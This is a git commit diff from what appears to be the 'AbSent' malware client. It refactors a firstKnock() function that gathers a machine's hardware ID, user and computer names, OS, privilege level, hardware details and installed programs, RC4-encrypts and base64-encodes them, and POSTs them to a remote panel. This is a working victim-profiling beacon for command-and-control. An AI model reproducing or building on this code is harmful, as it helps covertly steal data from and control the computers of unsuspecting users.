e3bc9b6d097e1b4eb3a25d0bb20056275708d9f2
yattaze <arthurhuia@gmail.com>
2019-04-25 18:41:25 +1200

    Refactored firstKnock()

--- Client/Full/AbSentClientFull/AbSentClientFull/AbSent/comm/panel.h
+++ Client/Full/AbSentClientFull/AbSentClientFull/AbSent/comm/panel.h
@@ -22,22 +22,9 @@ namespace absent
 		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
 		{
 			absent::crypto::RC4 rc4;
-			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bn"], key).c_str());	//Build Name
-			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bt"], key).c_str());	//Build Type
-			info["bn"] = absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str());	//Build
-			info["hw"] = absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str());	//Hardware Id
-			info["un"] = absent::crypto::b64::encode(rc4.crypt(info["un"], key).c_str());	//User Name
-			info["cn"] = absent::crypto::b64::encode(rc4.crypt(info["cn"], key).c_str());	//Computer Name
-			info["os"] = absent::crypto::b64::encode(rc4.crypt(info["os"], key).c_str());	//Operating System
-			info["pr"] = absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str());	//Client Privlege
-			info["ip"] = absent::crypto::b64::encode(rc4.crypt(info["ip"], key).c_str());	//Install Path
-			info["cp"] = absent::crypto::b64::encode(rc4.crypt(info["cp"], key).c_str());	//Cpu Info
-			info["ca"] = absent::crypto::b64::encode(rc4.crypt(info["ca"], key).c_str());	//Cpu Architecture
-			info["cc"] = absent::crypto::b64::encode(rc4.crypt(info["cc"], key).c_str());	//Cpu Core Count
-			info["gp"] = absent::crypto::b64::encode(rc4.crypt(info["gp"], key).c_str());	//Gpu
-			info["ra"] = absent::crypto::b64::encode(rc4.crypt(info["ra"], key).c_str());	//Ram
-			info["vr"] = absent::crypto::b64::encode(rc4.crypt(info["vr"], key).c_str());	//Vram
-			for (int ip = 0; ip < info["fp"].size(); ip++) {info["fp"][ip] =  absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str());} //Found / Installed Programs
+
+			for (auto& el : info.items()) { if (el.key() != "fp") { el.value() = absent::crypto::b64::encode(rc4.crypt(el.value(), key).c_str()); } }
+			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
 			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
 
 			return absent::http::post(host, path, toSend);
